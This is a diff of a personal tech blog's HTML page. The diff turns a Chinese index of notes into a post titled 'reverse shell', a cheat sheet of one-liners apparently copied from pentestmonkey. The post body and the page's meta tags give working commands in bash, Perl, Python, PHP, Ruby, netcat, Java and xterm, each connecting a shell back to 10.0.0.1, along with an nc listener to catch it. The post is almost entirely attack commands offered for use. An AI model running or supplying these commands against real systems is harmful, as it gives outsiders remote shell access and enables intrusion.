@@ -3,7 +3,7 @@
 <head>
   <meta charset="utf-8">
   <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
-  <title>docs - Feisky</title>
+  <title>reverse shell - Feisky</title>
   <meta name="renderer" content="webkit" />
 <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
 
@@ -17,7 +17,11 @@
 
 
 <meta name="author" content="Feisky" />
-  <meta name="description" content="一些读书笔记和有趣的文章 容器的世界 Kubernetes指南 Kubernetes开发环境指南 CRI-O Serverless 容器编排系统对比 容器网络方案对比 Docker 1.12 SELinux 京东容器" />
+  <meta name="description" content="Listen for 8080 first  nc -l -p 8080 -vvv  Bash Some versions of bash can send you a reverse shell (this was tested on Ubuntu 10.10):
+ bash -i &amp; /dev/tcp/10.0.0.1/8080 0&amp;1  PERL Here’s a shorter, feature-free version of the perl-reverse-shell:
+ perl -e &#39;use Socket;$i=&#34;10.0.0.1&#34;;$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&#34;tcp&#34;));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,&#34;&amp;S&#34;);open(STDOUT,&#34;&amp;S&#34;);open(STDERR,&#34;&amp;S&#34;);exec(&#34;/bin/sh -i&#34;);};&#39;  There’s also an&amp;nbsp;alternative PERL revere shell here.
+Python This was tested under Linux / Python 2.7:
+ python -c &#39;import socket,subprocess,os;s=socket." />
 
   <meta name="keywords" content="Kubernetes, Cloud, SDN" />
 
@@ -29,7 +33,7 @@
 <meta name="generator" content="Hugo 0.37.1" />
 
 
-<link rel="canonical" href="https://feisky.xyz/docs/" />
+<link rel="canonical" href="https://feisky.xyz/post/2015-01-28-reverse-shell/" />
 
 <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
 <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
@@ -49,10 +53,14 @@
 
 
 
-<meta property="og:title" content="docs" />
-<meta property="og:description" content="一些读书笔记和有趣的文章 容器的世界 Kubernetes指南 Kubernetes开发环境指南 CRI-O Serverless 容器编排系统对比 容器网络方案对比 Docker 1.12 SELinux 京东容器" />
+<meta property="og:title" content="reverse shell" />
+<meta property="og:description" content="Listen for 8080 first  nc -l -p 8080 -vvv  Bash Some versions of bash can send you a reverse shell (this was tested on Ubuntu 10.10):
+ bash -i & /dev/tcp/10.0.0.1/8080 0&1  PERL Here’s a shorter, feature-free version of the perl-reverse-shell:
+ perl -e &#39;use Socket;$i=&#34;10.0.0.1&#34;;$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&#34;tcp&#34;));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,&#34;&S&#34;);open(STDOUT,&#34;&S&#34;);open(STDERR,&#34;&S&#34;);exec(&#34;/bin/sh -i&#34;);};&#39;  There’s also an&nbsp;alternative PERL revere shell here.
+Python This was tested under Linux / Python 2.7:
+ python -c &#39;import socket,subprocess,os;s=socket." />
 <meta property="og:type" content="article" />
-<meta property="og:url" content="https://feisky.xyz/docs/" />
+<meta property="og:url" content="https://feisky.xyz/post/2015-01-28-reverse-shell/" />
 
 
 
@@ -69,19 +77,27 @@
 
 
 
-<meta itemprop="name" content="docs">
-<meta itemprop="description" content="一些读书笔记和有趣的文章 容器的世界 Kubernetes指南 Kubernetes开发环境指南 CRI-O Serverless 容器编排系统对比 容器网络方案对比 Docker 1.12 SELinux 京东容器">
+<meta itemprop="name" content="reverse shell">
+<meta itemprop="description" content="Listen for 8080 first  nc -l -p 8080 -vvv  Bash Some versions of bash can send you a reverse shell (this was tested on Ubuntu 10.10):
+ bash -i & /dev/tcp/10.0.0.1/8080 0&1  PERL Here’s a shorter, feature-free version of the perl-reverse-shell:
+ perl -e &#39;use Socket;$i=&#34;10.0.0.1&#34;;$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&#34;tcp&#34;));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,&#34;&S&#34;);open(STDOUT,&#34;&S&#34;);open(STDERR,&#34;&S&#34;);exec(&#34;/bin/sh -i&#34;);};&#39;  There’s also an&nbsp;alternative PERL revere shell here.
+Python This was tested under Linux / Python 2.7:
+ python -c &#39;import socket,subprocess,os;s=socket.">
 
 
 
-<meta itemprop="wordCount" content="137">
+<meta itemprop="wordCount" content="298">
 
 
 
 <meta itemprop="keywords" content="" />
 <meta name="twitter:card" content="summary"/>
-<meta name="twitter:title" content="docs"/>
-<meta name="twitter:description" content="一些读书笔记和有趣的文章 容器的世界 Kubernetes指南 Kubernetes开发环境指南 CRI-O Serverless 容器编排系统对比 容器网络方案对比 Docker 1.12 SELinux 京东容器"/>
+<meta name="twitter:title" content="reverse shell"/>
+<meta name="twitter:description" content="Listen for 8080 first  nc -l -p 8080 -vvv  Bash Some versions of bash can send you a reverse shell (this was tested on Ubuntu 10.10):
+ bash -i & /dev/tcp/10.0.0.1/8080 0&1  PERL Here’s a shorter, feature-free version of the perl-reverse-shell:
+ perl -e &#39;use Socket;$i=&#34;10.0.0.1&#34;;$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&#34;tcp&#34;));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,&#34;&S&#34;);open(STDOUT,&#34;&S&#34;);open(STDERR,&#34;&S&#34;);exec(&#34;/bin/sh -i&#34;);};&#39;  There’s also an&nbsp;alternative PERL revere shell here.
+Python This was tested under Linux / Python 2.7:
+ python -c &#39;import socket,subprocess,os;s=socket."/>
 
 <!--[if lte IE 9]>
   <script src="https://cdnjs.cloudflare.com/ajax/libs/classlist/1.1.20170427/classList.min.js"></script>
@@ -155,69 +171,185 @@
       <div class="content-wrapper">
         <div id="content" class="content">
           <article class="post">
-  <div class="post-content">
+    
+    <header class="post-header">
+      <h1 class="post-title">reverse shell</h1>
+
+      <div class="post-meta">
+        <span class="post-time"> 0001-01-01 </span>
+        
+        <span class="more-meta"> 298 words </span>
+        <span class="more-meta"> 2 mins read </span>
+        
+      </div>
+    </header>
+
+    
+    
+<div class="post-toc" id="post-toc">
+  <h2 class="post-toc-title">Contents</h2>
+  
+  <div class="post-toc-content">
+    <nav id="TableOfContents">
+<ul>
+<li>
+<ul>
+<li>
+<ul>
+<li><a href="#listen-for-8080-first">Listen for 8080 first</a></li>
+<li><a href="#bash">Bash</a></li>
+<li><a href="#perl">PERL</a></li>
+<li><a href="#python">Python</a></li>
+<li><a href="#php">PHP</a></li>
+<li><a href="#ruby">Ruby</a></li>
+<li><a href="#netcat">Netcat</a></li>
+<li><a href="#java">Java</a></li>
+<li><a href="#xterm">xterm</a></li>
+</ul></li>
+</ul></li>
+</ul>
+</nav>
+  </div>
+</div>
+
+    
+    <div class="post-content">
       
 
-<p><em>一些读书笔记和有趣的文章</em></p>
+<h3 id="listen-for-8080-first">Listen for 8080 first</h3>
 
-<h2 id="容器的世界">容器的世界</h2>
+<pre>
+nc -l -p 8080 -vvv
+</pre>
 
-<ul>
-<li><a href="http://feisky.xyz/k8s/">Kubernetes指南</a></li>
-<li><a href="http://feisky.xyz/kubernetes-dev/">Kubernetes开发环境指南</a></li>
-<li><a href="/container/cri-o/">CRI-O</a></li>
-<li><a href="/2016/02/26/Notes-about-serverless/">Serverless</a></li>
-<li><a href="http://calcotestudios.com/ccco">容器编排系统对比</a></li>
-<li><a href="https://leecalcote.github.io/ccco/overlay-underlay-betting-on-container-networking.html">容器网络方案对比</a></li>
-<li><a href="http://dockerconrecap-leecalcote.rhcloud.com/#/">Docker 1.12</a></li>
-<li><a href="/container/selinux/">SELinux</a></li>
-<li><a href="jd-container/">京东容器建设之路</a></li>
-<li><a href="networking-namespace/">Network namespace</a></li>
-</ul>
+<h3 id="bash">Bash</h3>
 
-<h2 id="虚拟化">虚拟化</h2>
+<p>Some versions of <a href="http://www.gnucitizen.org/blog/reverse-shell-with-bash/">bash can send you a reverse shell</a> (this was tested on Ubuntu 10.10):</p>
 
-<ul>
-<li><a href="/virtualization/GPU/">GPU虚拟化</a></li>
-<li><a href="/virtualization/SR-IOV/">SR-IOV</a></li>
-<li><a href="http://awilliam.github.io/presentations/KVM-Forum-2016/">VFIO</a></li>
-</ul>
+<pre>
+bash -i >& /dev/tcp/10.0.0.1/8080 0>&1
+</pre>
 
-<h2 id="分布式系统">分布式系统</h2>
+<h3 id="perl">PERL</h3>
 
-<ul>
-<li><a href="http://feisky.xyz/distributed/">分布式系统简介</a></li>
-<li><a href="http://feisky.xyz/distributed/paxos/">Paxos</a></li>
-<li><a href="http://feisky.xyz/distributed/raft/">Raft</a></li>
-<li><a href="http://feisky.xyz/distributed/zab/">Zab</a></li>
-</ul>
+<p>Here’s a shorter, feature-free version of the <a href="http://pentestmonkey.net/tools/web-shells/perl-reverse-shell">perl-reverse-shell</a>:</p>
 
-<h2 id="sdn网络">SDN网络</h2>
+<pre>
+perl -e 'use Socket;$i="10.0.0.1";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
+</pre>
 
-<ul>
-<li><a href="http://feisky.xyz/sdn/">SDN网络</a></li>
-<li><a href="http://feisky.xyz/sdn/dpdk/">DPDK</a></li>
-</ul>
+<p>There’s also an&nbsp;<a href="http://www.plenz.com/reverseshell">alternative PERL revere shell here</a>.</p>
 
-<h2 id="机器学习">机器学习</h2>
+<h3 id="python">Python</h3>
 
-<ul>
-<li><a href="http://feisky.xyz/machine-learning/">机器学习笔记</a></li>
-<li><a href="http://feisky.xyz/machine-learning/visualization/">数据可视化</a></li>
-<li><a href="http://feisky.xyz/machine-learning/cnn/">CNN</a></li>
-<li><a href="http://feisky.xyz/machine-learning/rnn/">RNN</a></li>
-<li><a href="http://feisky.xyz/machine-learning/tensorflow/">Tensorflow</a></li>
-</ul>
+<p>This was tested under Linux / Python 2.7:</p>
 
-<h2 id="其他">其他</h2>
+<pre>
+python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+</pre>
 
-<ul>
-<li><a href="amazon-leadership/">Amazon Leadership Principles</a></li>
-<li><a href="架构即未来/">架构即未来</a></li>
-</ul>
+<h3 id="php">PHP</h3>
 
-  </div>
-</article>
+<p>This code assumes that the TCP connection uses file descriptor 3. &nbsp;This worked on my test system. &nbsp;If it doesn’t work, try 4, 5, 6…</p>
+
+<pre>
+php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");'
+</pre>
+
+<p>If you want a .php file to upload, see the more featureful and robust <a href="http://pentestmonkey.net/tools/web-shells/php-reverse-shell">php-reverse-shell</a>.</p>
+
+<h3 id="ruby">Ruby</h3>
+
+<pre>
+ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",1234).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
+</pre>
+
+<h3 id="netcat">Netcat</h3>
+
+<p>Netcat is rarely present on production systems and even if it is there are several version of netcat, some of which don’t support the -e option.</p>
+
+<pre>
+nc -e /bin/sh 10.0.0.1 1234
+</pre>
+
+<p>If you have the wrong version of netcat installed, <a href="http://www.gnucitizen.org/blog/reverse-shell-with-bash/#comment-127498">Jeff Price points out here</a> that you might still be able to get your reverse shell back like this:</p>
+
+<pre>
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f
+</pre>
+
+<h3 id="java">Java</h3>
+
+<pre>
+r = Runtime.getRuntime()
+p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.0.0.1/2002;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
+p.waitFor()
+</pre>
+
+<p>[Untested submission from anonymous reader]</p>
+
+<h3 id="xterm">xterm</h3>
+
+<p>One of the simplest forms of reverse shell is an xterm session. &nbsp;The following command should be run on the server. &nbsp;It will try to connect back to you (10.0.0.1) on TCP port 6001.</p>
+
+<pre>
+xterm -display 10.0.0.1:1
+</pre>
+
+<p>To catch the incoming xterm, start an X-Server (:1 – which listens on TCP port 6001). &nbsp;One way to do this is with Xnest (to be run on your system):</p>
+
+<pre>
+Xnest :1
+</pre>
+
+<p>You’ll need to authorise the target to connect to you (command also run on your host):</p>
+
+<pre>
+xhost +targetip
+</pre>
+
+    </div>
+
+    
+    <div class="post-copyright">
+  <p class="copyright-item">
+    <span class="item-title">Author</span>
+    <span class="item-content">Feisky</span>
+  </p>
+  <p class="copyright-item">
+    <span class="item-title">LastMod</span>
+    <span class="item-content">2018-04-01</span>
+  </p>
+  
+  <p class="copyright-item">
+    <span class="item-title">License</span>
+    <span class="item-content"><a rel="license noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a></span>
+  </p>
+</div>
+
+    
+    
+
+    <footer class="post-footer">
+      
+
+      
+      <nav class="post-nav">
+        
+          <a class="prev" href="/post/2015-06-05-git-commit/">
+            <i class="iconfont icon-left"></i>
+            <span class="prev-text nav-default">git commit修改前一次提交的方法</span>
+            <span class="prev-text nav-mobile">Prev</span>
+          </a>
+        
+          <a class="next" href="/post/2015-06-24-sysdig/">
+            <span class="next-text nav-default">sysdig</span>
+            <span class="prev-text nav-mobile">Next</span>
+            <i class="iconfont icon-right"></i>
+          </a>
+      </nav>
+    </footer>
+  </article>
         </div>
         
   <div id="disqus_thread"></div>
